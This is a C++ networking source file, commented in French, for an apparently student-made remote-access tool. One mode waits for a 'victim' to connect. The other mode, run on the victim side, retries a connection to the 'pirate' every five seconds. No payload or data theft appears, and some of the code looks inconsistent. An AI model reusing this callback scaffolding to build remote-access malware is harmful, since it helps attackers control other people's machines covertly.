//
// Created by Berlingot on 2023-04-20.
//

#include "Connexion.h"

Connexion* Connexion::connexionptrreference;

Connexion::Connexion(const char * adresseIP, unsigned short port, ConnexionType ConnexionTypearg) {
    switch (ConnexionTypearg) {
        case ConnexionType::INBOUND:
            INBOUNDconnexion(adresseIP,port);
            break;
        case ConnexionType::OUTBOUND:
            OUTBOUNDconnexion(adresseIP,port);
            break;
        default:break;
    }
}

void Connexion::INBOUNDconnexion(const char *adresseIP, unsigned short port) {
    if(MyPNet::Network::Initialize()){

        if(_socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;
            if (_socket.Listen(MyPNet::IPEndpoint("127.0.0.1",1337))==MyPNet::PResult::P_Success){
                std::cout << "Écoute du Socket complété"<<std::endl;
                //new connection
                MyPNet::Socket connectionACible;
                std::cout<<"Lancement de l'écoute pour la connetion d'une victime" << std::endl;

                if (_socket.AcceptConnection(_socket) == MyPNet::PResult::P_Success){
                    std::cout<<"Victime connecté" << std::endl;
                    connexionptrreference = this;
                    this->adresseIP.sin_addr.s_addr = inet_addr("127.0.0.1"); //Broadcast locally
                    this->adresseIP.sin_port = htons(13337); //Port
                    this->adresseIP.sin_family = AF_INET; //IPv4 Socket
                    listenning();
                    }
                }
        }
    }
}
/*
if(MyPNet::Network::Initialize()){

        MyPNet::Socket socket;
        if(socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;
            if (socket.Listen(MyPNet::IPEndpoint("127.0.0.1",1337))==MyPNet::PResult::P_Success){
                std::cout << "Écoute du Socket complété"<<std::endl;
                //new connection
                MyPNet::Socket connectionACible;
                std::cout<<"Lancement de l'écoute pour la connetion d'une victime" << std::endl;

                if (socket.AcceptConnection(connectionACible) == MyPNet::PResult::P_Success){
                    std::cout<<"Victime connecté" << std::endl;

                    std::string buffer = "";
                    uint32_t  a(3), b(2), c(1);
                    MyPNet::Packet packet;
                    while(true){
                        MyPNet::PResult result = connectionACible.ReceivePaquets(packet);
                        if (result != MyPNet::PResult::P_Success){
                            break;
                        }
                        if (!ProcessPacket(packet)){
                            break;
                        }
                    }
                }
            }

            socket.CloseSocket();
        }
    }

    MyPNet::Network::Shutdown(); //ferme l'interface
    return 0;
*/

void Connexion::OUTBOUNDconnexion(const char *adresseIP, unsigned short port) {
    if(MyPNet::Network::Initialize()){
        if(_socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;

            std::cout << std::endl<< "Tentative de connexion au pirate"<<std::endl;
            while(pirateTrouvee == false) {
                if (_socket.ConnectTo(MyPNet::IPEndpoint(adresseIP, port)) == MyPNet::PResult::P_Success) {
                    pirateTrouvee = true;
                    std::cout << "Connexion établie" << std::endl;
                    return;
                } else { std::cout << std::endl << "Tentative de connexion échoué." << std::endl << "Nouvelle tentative dans 5 secondes" << std::endl; sleep(5);}
            }
        }
    }
}

bool Connexion::listenning() {

    listenersocket = socket(AF_INET, SOCK_STREAM, NULL);
    int result;
    result = bind(listenersocket, (SOCKADDR*)&adresseIP, sizeof(adresseIP));
    if(result){ // il y a erreur lors du bind
        std::string ErrorMsg = "Failed to bind" + std::to_string(WSAGetLastError());
        MessageBoxA(NULL, ErrorMsg.c_str(), "Error", MB_OK | MB_ICONERROR);
        exit(1);    }
    result = listen(listenersocket, SOMAXCONN);
    if (result) { // Echeck de l'écoute du socket
        std::string ErrorMsg = "Failed to listen on listening socket. Winsock Error:" + std::to_string(WSAGetLastError());
        MessageBoxA(NULL, ErrorMsg.c_str(), "Error", MB_OK | MB_ICONERROR);
        exit(1);
    }

    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)TransmitionDePaquetThread, NULL, NULL, NULL);
    return false;
}

void Connexion::TransmitionDePaquetThread() {

    while (true)
    {
        for (size_t i = 0; i < connexionptrreference->activeconnection.size(); i++) //for each connection...
        {
            if (connexionptrreference->activeconnection[i]->gestionpacket.HasPendingPackets()) //If there are pending packets for this connection's packet manager
            {
                Packet p = connexionptrreference->activeconnection[i]->gestionpacket.Retrieve(); //Retrieve packet from packet manager
                if (!connexionptrreference->sendallpack(i, p.buffer, p.size)) //send packet to connection
                {
                    std::cout << "Failed to send packet to ID: " << i << std::endl; //Print out if failed to send packet
                }
                delete p.buffer; //Clean up buffer from the packet p
            }
        }
        Sleep(5);
    }
}

bool Connexion::sendallpack(int ID, char *data, int totalbytes) {

    int bytessent = 0; //Holds the total bytes sent
    while (bytessent < totalbytes) //While we still have more bytes to send
    {
        int RetnCheck = send(activeconnection[ID]->socket, data + bytessent, totalbytes - bytessent, NULL); //Try to send remaining bytes
        if (RetnCheck == SOCKET_ERROR) //If there is a socket error while trying to send bytes
            return false; //Return false - failed to sendall
        bytessent += RetnCheck; //Add to total bytes sent
    }
    return true; //Success!
}
